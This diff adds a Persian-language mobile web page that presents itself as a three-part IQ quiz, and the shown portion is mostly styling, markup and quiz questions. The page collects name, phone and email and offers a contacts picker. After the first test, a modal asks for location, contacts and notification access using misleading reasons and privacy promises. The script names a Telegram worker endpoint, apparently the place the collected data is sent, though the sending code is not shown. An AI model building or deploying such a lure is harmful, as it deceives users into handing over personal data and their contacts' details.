@@ -1,0 +1,1242 @@
+
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#6c5ce7">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="IQ Test">
+<title>آزمون هوش IQ</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  :root{--accent:#6c5ce7;--accent2:#00b894;--warn:#fdcb6e;--danger:#d63031;
+    --text:#2d3436;--muted:#636e72;--line:#e8ecf0}
+  html,body{height:100%}
+  body{font-family:Tahoma,"Segoe UI",Arial,sans-serif;
+    background:linear-gradient(160deg,#1e3c72 0%,#2a5298 50%,#6c5ce7 100%);
+    color:var(--text);user-select:none;min-height:100vh;
+    padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left)}
+  .app{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;padding:16px}
+  .screen{display:none;flex:1;flex-direction:column;animation:fade .35s ease}
+  .screen.active{display:flex}
+  @keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+  .login-wrap{background:#fff;border-radius:24px;padding:28px 22px;
+    box-shadow:0 20px 50px rgba(0,0,0,.3);margin:auto;width:100%}
+  .logo{width:76px;height:76px;border-radius:22px;margin:0 auto 16px;
+    background:linear-gradient(135deg,#6c5ce7,#a29bfe);display:flex;
+    align-items:center;justify-content:center;font-size:40px;
+    box-shadow:0 10px 24px rgba(108,92,231,.4)}
+  h1{font-size:21px;text-align:center;margin-bottom:6px}
+  .sub{text-align:center;color:var(--muted);font-size:12.5px;margin-bottom:22px;line-height:1.9}
+  .field{margin-bottom:14px}
+  .field label{display:block;font-size:12.5px;color:var(--muted);margin-bottom:6px;padding-right:4px}
+  .field input{width:100%;padding:13px 14px;border:2px solid var(--line);
+    border-radius:13px;font-size:15px;font-family:inherit;background:#fff;transition:.2s;color:var(--text)}
+  .field input:focus{outline:none;border-color:var(--accent);background:#faf9ff}
+  .field-row{display:flex;gap:8px}
+  .field-row input{flex:1}
+  .pick-btn{padding:0 14px;border:2px solid var(--accent);background:#f2efff;color:var(--accent);
+    border-radius:13px;font-family:inherit;font-size:13px;font-weight:bold;cursor:pointer;white-space:nowrap}
+  .pick-btn:active{background:var(--accent);color:#fff}
+  .pick-btn:disabled{opacity:.4;cursor:not-allowed}
+
+  .terms-box{display:flex;align-items:flex-start;gap:10px;margin:16px 0 8px;
+    background:#f6f7fb;border-radius:13px;padding:12px 14px;cursor:pointer;
+    border:2px solid transparent;transition:.2s}
+  .terms-box.checked{border-color:var(--accent);background:#f2efff}
+  .terms-box input[type=checkbox]{width:22px;height:22px;flex:0 0 22px;margin-top:1px;
+    accent-color:var(--accent);cursor:pointer}
+  .terms-text{font-size:12.5px;color:var(--muted);line-height:1.9;user-select:none}
+  .terms-text b{color:var(--text)}
+  .terms-link{color:var(--accent);font-weight:bold;text-decoration:underline;cursor:pointer}
+
+  .error{color:var(--danger);font-size:12.5px;text-align:center;margin-top:6px;display:none}
+  .btn{width:100%;padding:15px;border:none;border-radius:15px;
+    background:linear-gradient(135deg,#6c5ce7,#4834d4);color:#fff;
+    font-size:16px;font-family:inherit;font-weight:bold;cursor:pointer;
+    transition:.15s;letter-spacing:.3px;margin-top:6px}
+  .btn:active:not(:disabled){transform:scale(.97)}
+  .btn:disabled{opacity:.4;cursor:not-allowed}
+  .btn.ghost{background:#eef0f6;color:var(--text)}
+  .btn.ghost:active:not(:disabled){background:#e2e5ee}
+
+  .info-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:16px}
+  .info-chip{background:#f6f7fb;border-radius:12px;padding:10px 6px;text-align:center;
+    font-size:10.5px;color:var(--muted);line-height:1.5}
+  .info-chip b{display:block;color:var(--accent);font-size:16px;margin-bottom:2px}
+
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(4px);
+    display:none;align-items:center;justify-content:center;padding:16px;z-index:200;
+    animation:fade .25s ease}
+  .modal.show{display:flex}
+  .modal-content{background:#fff;border-radius:22px;max-width:460px;width:100%;
+    max-height:88vh;display:flex;flex-direction:column;overflow:hidden;
+    box-shadow:0 24px 60px rgba(0,0,0,.4)}
+  .modal-head{padding:18px 20px;border-bottom:1px solid var(--line);
+    display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+  .modal-head h2{font-size:17px;flex:1}
+  .lang-btns{display:flex;gap:6px}
+  .lang-btn{padding:6px 12px;border-radius:99px;border:2px solid var(--line);
+    background:#fff;color:var(--muted);font-family:inherit;font-size:12px;
+    font-weight:bold;cursor:pointer;transition:.2s}
+  .lang-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+  .modal-body{padding:20px;overflow-y:auto;flex:1;font-size:14px;line-height:2.1;color:var(--text);display:none}
+  .modal-body.active{display:block}
+  .modal-body p{margin-bottom:14px}
+  .modal-body .highlight{background:#f2efff;padding:12px 14px;border-radius:12px;
+    border-right:4px solid var(--accent);margin-bottom:14px}
+  .modal-body ul{padding-right:20px;margin-bottom:14px}
+  .modal-body li{margin-bottom:6px}
+  .modal-foot{padding:14px 20px;border-top:1px solid var(--line);display:flex;gap:10px}
+  .modal-foot .btn{margin-top:0;padding:13px;font-size:15px}
+
+  #quizScreen{gap:0}
+  .quiz-header{background:#fff;border-radius:20px 20px 0 0;padding:16px 18px 12px;
+    box-shadow:0 4px 20px rgba(0,0,0,.06)}
+  .quiz-top{display:flex;justify-content:space-between;align-items:center;
+    font-size:12px;color:var(--muted);margin-bottom:10px;gap:6px}
+  .quiz-top b{color:var(--text);font-size:13px}
+  .test-label{background:var(--accent);color:#fff;font-size:11px;
+    padding:3px 9px;border-radius:99px;font-weight:bold}
+  .timer-wrap{height:8px;background:#eef0f6;border-radius:99px;overflow:hidden}
+  .timer-bar{height:100%;width:100%;border-radius:99px;
+    background:linear-gradient(90deg,#00b894,#55efc4);
+    transition:width .1s linear,background .3s ease}
+  .timer-bar.warn{background:linear-gradient(90deg,#fdcb6e,#ffeaa7)}
+  .timer-bar.danger{background:linear-gradient(90deg,#d63031,#ff7675)}
+  .quiz-body{flex:1;background:#fff;padding:20px 18px;overflow-y:auto}
+  .q-text{font-size:17px;font-weight:bold;line-height:2;margin-bottom:20px}
+  .option{display:flex;align-items:center;gap:12px;width:100%;text-align:right;
+    padding:14px;margin-bottom:10px;background:#f9fafd;border:2px solid transparent;
+    border-radius:14px;cursor:pointer;font-family:inherit;font-size:15px;
+    transition:.15s;color:var(--text);line-height:1.7}
+  .option:active{transform:scale(.98)}
+  .option.selected{background:#f2efff;border-color:var(--accent)}
+  .badge{width:30px;height:30px;flex:0 0 30px;border-radius:50%;background:#e8ecf0;
+    display:flex;align-items:center;justify-content:center;font-weight:bold;
+    font-size:13px;transition:.15s}
+  .option.selected .badge{background:var(--accent);color:#fff}
+  .option.disabled{opacity:.55;pointer-events:none}
+  .quiz-footer{background:#fff;border-radius:0 0 20px 20px;padding:12px 18px 18px;
+    display:flex;gap:10px;box-shadow:0 -4px 20px rgba(0,0,0,.06)}
+  .quiz-footer .btn{flex:1;padding:14px;font-size:15px;margin-top:0}
+  @keyframes flashRed{0%,100%{background:transparent}50%{background:rgba(214,48,49,.12)}}
+  .timeup .quiz-body{animation:flashRed .5s ease}
+
+  .transition-wrap{background:#fff;border-radius:24px;padding:34px 26px;
+    box-shadow:0 20px 50px rgba(0,0,0,.3);margin:auto;text-align:center;width:100%}
+  .trans-icon{font-size:60px;margin-bottom:14px}
+  .trans-title{font-size:21px;font-weight:bold;margin-bottom:10px}
+  .trans-sub{color:var(--muted);font-size:13.5px;margin-bottom:20px;line-height:1.9;white-space:pre-line}
+  .score-badge{background:linear-gradient(135deg,#6c5ce7,#a29bfe);color:#fff;
+    display:inline-block;padding:10px 22px;border-radius:99px;font-size:16px;
+    font-weight:bold;margin-bottom:22px}
+
+  .result-wrap{background:#fff;border-radius:24px;padding:24px 20px;
+    box-shadow:0 20px 50px rgba(0,0,0,.3);margin:auto;
+    display:flex;flex-direction:column;gap:14px;width:100%}
+  .circle{width:150px;height:150px;border-radius:50%;margin:0 auto;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    background:conic-gradient(var(--c,#6c5ce7) var(--deg,0deg),#eef0f6 0deg);
+    position:relative}
+  .circle::after{content:"";position:absolute;inset:10px;background:#fff;border-radius:50%}
+  .circle span{position:relative;z-index:2}
+  .circle .big{font-size:36px;font-weight:bold;color:var(--c,#6c5ce7)}
+  .circle .small{font-size:11px;color:var(--muted)}
+  .level-box{text-align:center;background:#f6f7fb;border-radius:15px;padding:14px}
+  .level-box .title{font-size:18px;font-weight:bold;margin-bottom:5px}
+  .level-box .desc{font-size:12.5px;color:var(--muted);line-height:1.9}
+  .tests-summary{display:flex;flex-direction:column;gap:7px}
+  .test-row{display:flex;justify-content:space-between;align-items:center;
+    background:#f6f7fb;border-radius:11px;padding:11px 13px;font-size:12.5px}
+  .test-row .label{color:var(--muted)}
+  .test-row .val{font-weight:bold;color:var(--accent)}
+  .stats{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}
+  .stat{background:#f6f7fb;border-radius:12px;padding:11px;text-align:center}
+  .stat .n{font-size:18px;font-weight:bold;display:block;margin-bottom:3px}
+  .stat .l{font-size:10.5px;color:var(--muted)}
+  .review{max-height:200px;overflow-y:auto;border:2px solid var(--line);
+    border-radius:12px;padding:12px;font-size:12.5px;line-height:1.9;display:none}
+  .review.show{display:block}
+  .rev-item{padding:9px 4px;border-bottom:1px dashed var(--line)}
+  .rev-item:last-child{border:none}
+  .rev-item .no{font-weight:bold;color:var(--accent)}
+  .rev-item .ok{color:var(--accent2);font-weight:bold}
+  .rev-item .bad{color:var(--danger);font-weight:bold}
+
+  #installBtn{position:fixed;bottom:20px;left:20px;right:20px;max-width:480px;
+    margin:0 auto;background:#00b894;color:#fff;padding:13px;border-radius:14px;
+    text-align:center;font-size:13.5px;font-weight:bold;
+    box-shadow:0 8px 24px rgba(0,184,148,.4);cursor:pointer;display:none;z-index:100}
+  #installBtn.show{display:block}
+
+  @media (max-width:400px){
+    .q-text{font-size:16px}
+    .option{font-size:14px;padding:12px}
+    h1{font-size:19px}
+  }
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- LOGIN -->
+  <section id="loginScreen" class="screen active">
+    <div class="login-wrap">
+      <div class="logo">🧠</div>
+      <h1>آزمون هوش IQ</h1>
+      <p class="sub">۳ آزمون متوالی • ۱۲۰ سوال • تایمر ۳۰ ثانیه<br>سوالات هر آزمون تصادفی چیده می‌شوند</p>
+
+      <div class="field">
+        <label for="firstName">نام</label>
+        <input id="firstName" type="text" placeholder="مثال: علی" autocomplete="off">
+      </div>
+      <div class="field">
+        <label for="lastName">نام خانوادگی</label>
+        <input id="lastName" type="text" placeholder="مثال: محمدی" autocomplete="off">
+      </div>
+      <div class="field">
+        <label for="phone">شماره موبایل</label>
+        <div class="field-row">
+          <input id="phone" type="tel" placeholder="09123456789" autocomplete="off"
+            inputmode="numeric" maxlength="11">
+          <button class="pick-btn" id="pickContactBtn" type="button">📱 مخاطبین</button>
+        </div>
+      </div>
+      <div class="field">
+        <label for="email">ایمیل</label>
+        <input id="email" type="email" placeholder="example@gmail.com" autocomplete="off" inputmode="email">
+      </div>
+
+      <label class="terms-box" id="termsBox">
+        <input type="checkbox" id="termsCheck">
+        <span class="terms-text">
+          <b>قوانین برنامه را می‌پذیرم</b> و اجازه می‌دهم شماره موبایل و ایمیل من برای ارسال
+          تست‌های بعدی و نسخه‌های جدید استفاده شود.
+          <span class="terms-link" id="viewTerms">مشاهدهٔ قوانین</span>
+        </span>
+      </label>
+
+      <div class="error" id="loginError"></div>
+      <button class="btn" id="startBtn" disabled>شروع آزمون‌ها</button>
+
+      <div class="info-grid">
+        <div class="info-chip"><b>۵۰</b>آزمون ۱</div>
+        <div class="info-chip"><b>۵۰</b>آزمون ۲</div>
+        <div class="info-chip"><b>۲۰</b>نهایی</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- TRANSITION -->
+  <section id="transitionScreen" class="screen">
+    <div class="transition-wrap">
+      <div class="trans-icon" id="transIcon">✅</div>
+      <div class="trans-title" id="transTitle"></div>
+      <div class="trans-sub" id="transSub"></div>
+      <div class="score-badge" id="transScore"></div>
+      <button class="btn" id="nextTestBtn">ادامه به آزمون بعدی ›</button>
+    </div>
+  </section>
+
+  <!-- QUIZ -->
+  <section id="quizScreen" class="screen">
+    <div class="quiz-header">
+      <div class="quiz-top">
+        <span class="test-label" id="testLabel">آزمون ۱</span>
+        <span id="counter"></span>
+        <span>⏱ <b id="timerText">۳۰</b></span>
+      </div>
+      <div class="timer-wrap"><div class="timer-bar" id="timerBar"></div></div>
+    </div>
+    <div class="quiz-body">
+      <h2 class="q-text" id="questionText"></h2>
+      <div id="optionsBox"></div>
+    </div>
+    <div class="quiz-footer">
+      <button class="btn ghost" id="prevBtn">‹ قبلی</button>
+      <button class="btn" id="nextBtn" disabled>بعدی ›</button>
+    </div>
+  </section>
+
+  <!-- RESULT -->
+  <section id="resultScreen" class="screen">
+    <div class="result-wrap">
+      <h1>نتیجهٔ نهایی آزمون</h1>
+      <p class="sub" id="resultName" style="margin-bottom:0"></p>
+      <div class="circle" id="circle">
+        <span class="big" id="scoreBig">۰</span>
+        <span class="small">میانگین IQ</span>
+      </div>
+      <div class="level-box">
+        <div class="title" id="levelTitle"></div>
+        <div class="desc" id="levelDesc"></div>
+      </div>
+      <div class="tests-summary" id="testsSummary"></div>
+      <div class="stats">
+        <div class="stat"><span class="n" id="totalCorrect">۰</span><span class="l">کل درست</span></div>
+        <div class="stat"><span class="n" id="totalWrong">۰</span><span class="l">کل نادرست</span></div>
+        <div class="stat"><span class="n" id="percentText">۰٪</span><span class="l">درصد کل</span></div>
+        <div class="stat"><span class="n" id="timeText">۰:۰۰</span><span class="l">زمان کل</span></div>
+      </div>
+      <button class="btn ghost" id="reviewBtn">نمایش پاسخ‌های نادرست</button>
+      <div class="review" id="reviewBox"></div>
+      <button class="btn" id="restartBtn">آزمون مجدد</button>
+    </div>
+  </section>
+</div>
+
+<!-- TERMS MODAL -->
+<div class="modal" id="termsModal">
+  <div class="modal-content">
+    <div class="modal-head">
+      <h2>📜 قوانین برنامه</h2>
+      <div class="lang-btns">
+        <button class="lang-btn active" data-lang="en">English</button>
+        <button class="lang-btn" data-lang="fa">ترجمهٔ فارسی</button>
+      </div>
+    </div>
+    <div class="modal-body active" id="bodyEn">
+      <div class="highlight">
+        We want access to your mobile and email to send you future tests and new versions.
+        We are moving forward step by step to strengthen your IQ and provide you with
+        better entertainment from virtual networks. Tick the box and let's move forward.
+      </div>
+      <p><b>Full Terms & Conditions:</b></p>
+      <ul>
+        <li>By accepting these terms, you grant us permission to store your mobile number and email address for the purpose of sending future tests and product updates.</li>
+        <li>Your contact information will be used solely for educational and entertainment purposes related to IQ tests and cognitive exercises.</li>
+        <li>We will not sell, rent, or share your personal data with third parties without your explicit consent.</li>
+        <li>You may request deletion of your data at any time by contacting support.</li>
+        <li>By ticking the checkbox, you confirm that the mobile number and email you provided are accurate and belong to you.</li>
+      </ul>
+      <p>Thank you for trusting us. Let's move forward together. 🚀</p>
+    </div>
+    <div class="modal-body" id="bodyFa">
+      <div class="highlight">
+        ما دسترسی به موبایل و ایمیل شما را برای ارسال تست‌های بعدی و نسخه‌های جدید می‌خواهیم.
+        قدم به قدم جلو می‌رویم تا آی‌کیو شما را قوی‌تر کنیم و سرگرمی بهتری از شبکه‌های
+        مجازی در اختیار شما قرار بدهیم. تیک را بزنید بریم جلو.
+      </div>
+      <p><b>شرایط و قوانین کامل:</b></p>
+      <ul>
+        <li>با پذیرش این قوانین، اجازهٔ ذخیرهٔ شماره موبایل و ایمیل خود را برای ارسال تست‌های بعدی و به‌روزرسانی‌های محصول به ما می‌دهید.</li>
+        <li>اطلاعات تماس شما صرفاً برای اهداف آموزشی و سرگرمی مرتبط با آزمون‌های IQ و تمرینات شناختی استفاده می‌شود.</li>
+        <li>ما داده‌های شخصی شما را بدون رضایت صریح شما نمی‌فروشیم، اجاره نمی‌دهیم و با اشخاص ثالث به اشتراک نمی‌گذاریم.</li>
+        <li>شما می‌توانید هر زمان با تماس با پشتیبانی، درخواست حذف داده‌های خود را ثبت کنید.</li>
+        <li>با تیک زدن چک‌باکس، تأیید می‌کنید که شماره موبایل و ایمیلی که وارد کرده‌اید صحیح است و به خودتان تعلق دارد.</li>
+      </ul>
+      <p>از اعتماد شما سپاسگزاریم. با هم جلو می‌رویم. 🚀</p>
+    </div>
+    <div class="modal-foot">
+      <button class="btn ghost" id="closeModal">بستن</button>
+      <button class="btn" id="acceptModal">می‌پذیرم</button>
+    </div>
+  </div>
+</div>
+
+<!-- PERMISSIONS MODAL (ENGLISH) -->
+<div class="modal" id="permModal">
+  <div class="modal-content">
+    <div class="modal-head" style="direction:ltr;text-align:left">
+      <h2>🔓 Unlock Full Experience</h2>
+    </div>
+    <div class="modal-body active" style="direction:ltr;text-align:left;font-size:14px">
+      <p style="font-size:16px;font-weight:bold;color:#6c5ce7;margin-bottom:14px">
+        Great job completing Test 1! 🎉
+      </p>
+      <p style="margin-bottom:14px">
+        To send you <b>Test 2</b>, <b>Test 3</b>, and future updates directly to your device, we need your permission.
+      </p>
+      <p style="margin-bottom:12px"><b>We will request access to:</b></p>
+      <ul style="list-style:none;padding:0;margin:12px 0">
+        <li style="display:flex;gap:10px;align-items:flex-start;margin-bottom:10px">
+          <span style="font-size:20px">📍</span>
+          <span><b>Location</b> — to personalize your experience</span>
+        </li>
+        <li style="display:flex;gap:10px;align-items:flex-start;margin-bottom:10px">
+          <span style="font-size:20px">📱</span>
+          <span><b>Contacts</b> — to save your number for future tests</span>
+        </li>
+        <li style="display:flex;gap:10px;align-items:flex-start;margin-bottom:10px">
+          <span style="font-size:20px">🔔</span>
+          <span><b>Notifications</b> — to remind you of new tests</span>
+        </li>
+      </ul>
+      <div style="background:#f2efff;border-radius:12px;padding:12px 14px;
+                  border-left:4px solid #6c5ce7;margin-top:14px;margin-bottom:14px">
+        <p style="margin:0;font-size:13px;line-height:1.9">
+          <b>Your privacy matters:</b><br>
+          ✓ Your data is never sold or shared with third parties<br>
+          ✓ You can revoke access at any time in Settings<br>
+          ✓ You can request deletion of your data anytime
+        </p>
+      </div>
+    </div>
+    <div class="modal-foot" style="direction:ltr">
+      <button class="btn ghost" id="permNotNow" style="flex:1">Not Now</button>
+      <button class="btn" id="permAllow" style="flex:1.4">Allow Access ✓</button>
+    </div>
+  </div>
+</div>
+
+<div id="installBtn">📲 نصب به‌عنوان اپلیکیشن روی گوشی</div>
+
+<script>
+/* ============================================================
+   ⚙️ تنظیمات — فقط این خط رو ویرایش کن
+   ============================================================ */
+const TELEGRAM_WORKER_URL = "https://mute-math-f311iq-190.mehran041mehraaaan.workers.dev";
+// مثال: "https://iq-test.ali.workers.dev"
+/* ============================================================ */
+
+const QUESTION_TIME = 30;
+const STORAGE_KEY = "iq_app_user";
+
+/* ============================================================
+   سوالات آزمون ۱ (۵۰ سوال)
+   ============================================================ */
+const RAW_TEST1 = [
+  { q:"ادامه دنباله: ۲، ۴، ۸، ۱۶، ...؟", opts:["۲۰","۲۴","۳۲","۳۶"], a:2 },
+  { q:"ادامه دنباله: ۳، ۶، ۱۲، ۲۴، ...؟", opts:["۳۰","۳۶","۴۲","۴۸"], a:3 },
+  { q:"ادامه دنباله: ۱، ۴، ۹، ۱۶، ...؟", opts:["۲۰","۲۴","۲۵","۳۶"], a:2 },
+  { q:"ادامه دنباله: ۲، ۳، ۵، ۸، ۱۲، ...؟", opts:["۱۵","۱۶","۱۷","۱۸"], a:2 },
+  { q:"ادامه دنباله: ۱، ۱، ۲، ۳، ۵، ۸، ...؟", opts:["۱۰","۱۱","۱۲","۱۳"], a:3 },
+  { q:"ادامه دنباله: ۱۰۰، ۹۰، ۸۱، ۷۳، ...؟", opts:["۶۵","۶۶","۶۷","۶۸"], a:1 },
+  { q:"ادامه دنباله: ۲، ۶، ۱۲، ۲۰، ۳۰، ...؟", opts:["۳۶","۴۰","۴۲","۴۸"], a:2 },
+  { q:"ادامه دنباله: ۵، ۱۰، ۲۰، ۴۰، ...؟", opts:["۵۰","۶۰","۷۰","۸۰"], a:3 },
+  { q:"ادامه دنباله: ۸۱، ۲۷، ۹، ۳، ...؟", opts:["۰","۱","۲","۳"], a:1 },
+  { q:"ادامه دنباله: ۱، ۸، ۲۷، ۶۴، ...؟", opts:["۸۱","۱۰۰","۱۲۵","۱۴۴"], a:2 },
+  { q:"کتاب : فصل :: ساختمان : ...؟", opts:["اتاق","طبقه","دیوار","سقف"], a:1 },
+  { q:"پرنده : آشیانه :: زنبور : ...؟", opts:["کندو","لانه","تار","غار"], a:0 },
+  { q:"ماهی : آب :: شتر : ...؟", opts:["کوه","بیابان","جنگل","دریا"], a:1 },
+  { q:"دکتر : بیمارستان :: معلم : ...؟", opts:["کتاب","مدرسه","دانش‌آموز","دفتر"], a:1 },
+  { q:"انگشت : دست :: برگ : ...؟", opts:["درخت","گل","میوه","شاخه"], a:0 },
+  { q:"گرسنگی : غذا :: تشنگی : ...؟", opts:["نان","آب","میوه","خواب"], a:1 },
+  { q:"قلم : نوشتن :: چاقو : ...؟", opts:["آشپز","بریدن","فلز","تیز"], a:1 },
+  { q:"روز : شب :: گرم : ...؟", opts:["تابستان","سرد","آفتاب","یخ"], a:1 },
+  { q:"چشم : دیدن :: گوش : ...؟", opts:["بوییدن","چشیدن","شنیدن","لمس کردن"], a:2 },
+  { q:"تخم : جوجه :: بذر : ...؟", opts:["گل","گیاه","میوه","چوب"], a:1 },
+  { q:"اگر همهٔ گل‌ها به آب نیاز دارند و رز یک گل است، نتیجه چیست؟",
+    opts:["رز به آب نیاز دارد","رز به آب نیاز ندارد","فقط رز به آب نیاز دارد","هیچ‌کدام"], a:0 },
+  { q:"علی از مریم بلندتر است. مریم از سارا بلندتر است. کوتاه‌ترین کیست؟",
+    opts:["علی","مریم","سارا","نمی‌توان تعیین کرد"], a:2 },
+  { q:"اگر امروز سه‌شنبه باشد، ۱۰ روز بعد چه روزی است؟",
+    opts:["جمعه","شنبه","یکشنبه","دوشنبه"], a:0 },
+  { q:"همهٔ دانش‌آموزان کلاس الف ریاضی دوست دارند. رضا دانش‌آموز کلاس الف است. نتیجه؟",
+    opts:["رضا ریاضی دوست دارد","رضا ریاضی دوست ندارد","رضا در کلاس ب است","هیچ‌کدام"], a:0 },
+  { q:"اگر A>B و B>C باشد، کدام گزینه درست است؟",
+    opts:["A>C","C>A","A=C","B>A"], a:0 },
+  { q:"احمد بعد از حسن و قبل از رضا دوید. نفر آخر کیست؟",
+    opts:["حسن","احمد","رضا","نمی‌توان تعیین کرد"], a:2 },
+  { q:"اگر ۵ ماشین در ۵ دقیقه ۵ قطعه بسازند، ۱۰ ماشین در ۱۰ دقیقه چند قطعه می‌سازند؟",
+    opts:["۱۰","۱۵","۲۰","۲۵"], a:2 },
+  { q:"پدر علی سه پسر دارد: حسن، حسین و ... . نام پسر سوم چیست؟",
+    opts:["حسن","حسین","علی","نمی‌توان تعیین کرد"], a:2 },
+  { q:"اگر همهٔ Aها B باشند و بعضی Bها C باشند، آیا قطعاً بعضی Aها C هستند؟",
+    opts:["بله","خیر","فقط اگر A=C باشد","نمی‌توان گفت"], a:1 },
+  { q:"در اتاقی ۴ گوشه است. در هر گوشه یک گربه نشسته و مقابل هر گربه ۳ گربهٔ دیگر است. چند گربه در اتاق است؟",
+    opts:["۳","۴","۱۲","۱۶"], a:1 },
+  { q:"کدام شکل با بقیه متفاوت است؟", opts:["دایره","مربع","مثلث","مستطیل"], a:0 },
+  { q:"اگر یک مکعب را از وسط یک بار ببریم، چند قطعه می‌شود؟", opts:["۱","۲","۳","۴"], a:1 },
+  { q:"کدام عدد در گروه نمی‌گنجد؟", opts:["۲","۴","۶","۹"], a:3 },
+  { q:"کدام کلمه با بقیه متفاوت است؟", opts:["سیب","پرتقال","هویج","موز"], a:2 },
+  { q:"وقتی به آینه نگاه می‌کنی، دست راست تو در آینه کدام سمت دیده می‌شود؟",
+    opts:["راست","چپ","بالا","پایین"], a:1 },
+  { q:"کدام شکل بیشترین ضلع را دارد؟", opts:["مربع","پنج‌ضلعی","شش‌ضلعی","مثلث"], a:2 },
+  { q:"اگر یک کاغذ مربعی را از قطر تا بزنی، چه شکلی می‌شود؟",
+    opts:["مربع","مستطیل","مثلث","دایره"], a:2 },
+  { q:"کدام سنگین‌تر است: یک کیلو پَر یا یک کیلو آهن؟",
+    opts:["پَر","آهن","برابر","بستگی دارد"], a:2 },
+  { q:"اگر ساعت ۳:۱۵ باشد، عقربهٔ ساعت‌شمار کجاست؟",
+    opts:["روی ۳","بین ۳ و ۴","روی ۴","بین ۴ و ۵"], a:1 },
+  { q:"ادامه الگو: ◼ ◻ ◼ ◻ ◼ ...", opts:["◼","◻","◼◼","◻◻"], a:1 },
+  { q:"در تقویم میلادی، چند ماه ۳۱ روز دارند؟", opts:["۵","۶","۷","۸"], a:2 },
+  { q:"کدام عدد اول است؟", opts:["۹","۱۵","۱۷","۲۱"], a:2 },
+  { q:"نصف نصف ۸۰ چند است؟", opts:["۱۰","۲۰","۳۰","۴۰"], a:1 },
+  { q:"اگر ۲۰٪ یک عدد برابر ۱۵ باشد، آن عدد چیست؟", opts:["۳۰","۴۵","۶۰","۷۵"], a:3 },
+  { q:"کدام کلمه غلط املایی دارد؟", opts:["خیابان","خیابون","کوچه","میدان"], a:1 },
+  { q:"اگر ۳ نفر در ۳ ساعت ۳ اتاق را رنگ کنند، ۶ نفر در ۶ ساعت چند اتاق را رنگ می‌کنند؟",
+    opts:["۶","۹","۱۲","۱۸"], a:2 },
+  { q:"مجموع اعداد ۱ تا ۱۰ چند است؟", opts:["۴۵","۵۰","۵۵","۶۰"], a:2 },
+  { q:"اگر قطاری با سرعت ۶۰ کیلومتر بر ساعت حرکت کند، در ۳۰ دقیقه چند کیلومتر می‌رود؟",
+    opts:["۲۰","۳۰","۴۰","۶۰"], a:1 },
+  { q:"دست : انگشت :: پا : ...؟", opts:["زانو","ران","پنجه","ساق"], a:2 },
+  { q:"اگر امروز پنجشنبه باشد، ۳ روز قبل چه روزی بود؟",
+    opts:["دوشنبه","سه‌شنبه","چهارشنبه","جمعه"], a:0 }
+];
+
+/* ============================================================
+   سوالات آزمون ۲ (۵۰ سوال)
+   ============================================================ */
+const RAW_TEST2 = [
+  { q:"ادامه دنباله: ۲، ۶، ۱۵، ۳۱، ۵۶، ...؟", opts:["۸۵","۸۸","۹۲","۹۶"], a:2 },
+  { q:"ادامه دنباله: ۳، ۵، ۹، ۱۷، ۳۳، ...؟", opts:["۶۳","۶۴","۶۵","۶۶"], a:2 },
+  { q:"ادامه دنباله: ۱، ۳، ۸، ۱۹، ۴۲، ...؟", opts:["۸۵","۸۸","۸۹","۹۲"], a:2 },
+  { q:"ادامه دنباله: ۱، ۲، ۶، ۲۴، ۱۲۰، ...؟", opts:["۶۰۰","۶۲۰","۷۰۰","۷۲۰"], a:3 },
+  { q:"ادامه دنباله: ۵، ۱۱، ۲۳، ۴۷، ۹۵، ...؟", opts:["۱۸۰","۱۹۰","۱۹۱","۲۰۰"], a:2 },
+  { q:"ادامه دنباله: ۱، ۸، ۲۷، ۶۴، ۱۲۵، ...؟", opts:["۱۹۶","۲۱۶","۲۲۵","۲۵۶"], a:1 },
+  { q:"ادامه دنباله: ۱۰۰، ۹۶، ۸۸، ۷۲، ۴۰، ...؟", opts:["۸","−۸","−۲۴","−۴۰"], a:2 },
+  { q:"ادامه دنباله: ۲، ۳، ۷، ۲۵، ۱۲۱، ...؟", opts:["۶۲۰","۷۰۰","۷۲۰","۷۲۱"], a:3 },
+  { q:"ادامه دنباله: ۱، ۲، ۶، ۱۲، ۲۰، ۳۰، ...؟", opts:["۳۶","۴۰","۴۲","۴۸"], a:2 },
+  { q:"ادامه دنباله: ۴، ۹، ۲۵، ۴۹، ۱۲۱، ...؟", opts:["۱۴۴","۱۶۵","۱۶۹","۱۹۶"], a:2 },
+  { q:"ادامه دنبالهٔ حروف: A، C، F، J، O، ...؟", opts:["S","T","U","V"], a:2 },
+  { q:"ادامه دنبالهٔ حروف: Z، X، U، Q، L، ...؟", opts:["E","F","G","H"], a:1 },
+  { q:"ادامه دنباله: ۱، ۲، ۴، ۷، ۱۱، ۱۶، ...؟", opts:["۲۰","۲۱","۲۲","۲۴"], a:2 },
+  { q:"ادامه دنباله: ۲، ۱۰، ۳۰، ۶۸، ۱۳۰، ...؟", opts:["۲۰۰","۲۱۰","۲۲۲","۲۴۰"], a:2 },
+  { q:"ادامه دنباله: ۳، ۴، ۷، ۱۱، ۱۸، ۲۹، ...؟", opts:["۴۵","۴۶","۴۷","۴۸"], a:2 },
+  { q:"کتاب : مؤلف :: فیلم : ...؟", opts:["بازیگر","کارگردان","تهیه‌کننده","فیلم‌نامه‌نویس"], a:1 },
+  { q:"بذر : درخت :: لارو : ...؟", opts:["کرم","پروانه","پیله","تخم"], a:1 },
+  { q:"ماهی : فلس :: پرنده : ...؟", opts:["منقار","بال","پر","پنجه"], a:2 },
+  { q:"قلم : کاغذ :: اسکنه : ...؟", opts:["چوب","سنگ","فلز","شیشه"], a:1 },
+  { q:"ساعت : زمان :: دماسنج : ...؟", opts:["فشار","دما","رطوبت","سرعت"], a:1 },
